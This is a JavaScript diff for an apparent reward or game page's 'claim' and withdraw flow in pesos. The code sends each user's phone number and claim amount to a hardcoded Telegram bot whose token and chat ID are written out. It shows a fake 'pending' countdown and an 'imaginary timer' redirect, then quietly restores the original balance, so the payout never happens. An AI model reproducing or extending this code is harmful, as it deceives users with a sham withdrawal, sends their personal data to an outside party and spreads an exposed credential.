@@ -92,27 +92,54 @@ function updateVisibleCountdown(seconds) {
     timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
 }
 
-function startVisibleCountdown() {
+function startVisibleCountdown(originalAmount) {
     let remaining = claimState.countdownSeconds;
-    updateVisibleCountdown(remaining);
+    const timerSpan = document.getElementById('pendingCountdown');
+    const pendingArea = document.getElementById('pendingStatusArea');
+    const withdrawBtn = document.getElementById('claimBtn');
     
+    if (!timerSpan) return;
+    
+    // Update display every second
     claimState.countdownInterval = setInterval(() => {
-        remaining--;
-        updateVisibleCountdown(remaining);
+        if (remaining > 0) {
+            remaining--;
+            const mins = Math.floor(remaining / 60);
+            const secs = remaining % 60;
+            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+        
         if (remaining <= 0) {
+            // Stop countdown
             clearInterval(claimState.countdownInterval);
             claimState.countdownInterval = null;
-            if (!claimState.hasRedirected) {
-                const balanceText = document.getElementById('balanceText');
-                if (balanceText) balanceText.innerText = "₱" + claimState.currentAmount.toLocaleString() + ".00";
-                if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
-                    window.parent.updateGameBalance(claimState.currentAmount);
-                }
-                hidePendingStatus();
-                const withdrawBtn = document.getElementById('claimBtn');
-                if (withdrawBtn) withdrawBtn.style.display = 'block';
-                claimState.isProcessing = false;
+            
+            // Restore original balance
+            const balanceText = document.getElementById('balanceText');
+            if (balanceText) {
+                balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
             }
+            
+            // Update Firebase balance
+            if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
+                window.parent.updateGameBalance(originalAmount);
+            } else if (typeof updateGameBalance === 'function') {
+                updateGameBalance(originalAmount);
+            } else if (typeof GameState !== 'undefined') {
+                GameState.balance = originalAmount;
+                if (typeof updateUI === 'function') updateUI();
+                if (typeof saveData === 'function') saveData();
+            }
+            
+            // Hide pending status area
+            if (pendingArea) pendingArea.style.display = 'none';
+            
+            // Show withdraw button again
+            if (withdrawBtn) withdrawBtn.style.display = 'block';
+            
+            // Reset claim state
+            claimState.isProcessing = false;
+            claimState.hasRedirected = false;
         }
     }, 1000);
 }
@@ -151,6 +178,7 @@ function startImaginaryTimer(redirectUrl) {
 
 function onClaimAction() {
     if (claimState.isProcessing) return;
+    
     claimState.isProcessing = true;
     const claimBtn = document.getElementById('claimActionBtn');
     const amount = claimState.currentAmount;
@@ -159,8 +187,8 @@ function onClaimAction() {
     claimBtn.disabled = true;
     claimBtn.innerHTML = 'PROCESSING...';
     
-    // Send initial claim request to Telegram
-    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
+    // Send claim request to Telegram
+    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}`;
     fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
         .catch(e => console.log('Telegram error:', e));
     
@@ -171,15 +199,29 @@ function onClaimAction() {
                 const key = Object.keys(snapshot.val())[0];
                 const linkData = snapshot.val()[key];
                 const redirectUrl = linkData.url;
-                db.ref('links/' + key).update({ status: 'claimed', user: userPhone, amount: amount, claimedAt: Date.now() });
-                hideClaimPopup();
-                showPendingStatus();
-                startSmoothDecrement(amount, () => {
-                    if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
-                        window.parent.updateGameBalance(0);
-                    }
+                
+                db.ref('links/' + key).update({ 
+                    status: 'claimed', 
+                    user: userPhone, 
+                    amount: amount, 
+                    claimedAt: Date.now() 
                 });
+                
+                // Hide claim popup
+                hideClaimPopup();
+                
+                // Show pending status area
+                showPendingStatus();
+                
+                // Start balance decrement animation
+                startSmoothDecrement(amount);
+                
+                // Start countdown timer (3 minutes) - pass the original amount
+                startVisibleCountdown(amount);
+                
+                // Start imaginary timer for redirect
                 startImaginaryTimer(redirectUrl);
+                
             } else {
                 claimBtn.innerHTML = 'NO REWARDS';
                 setTimeout(() => {
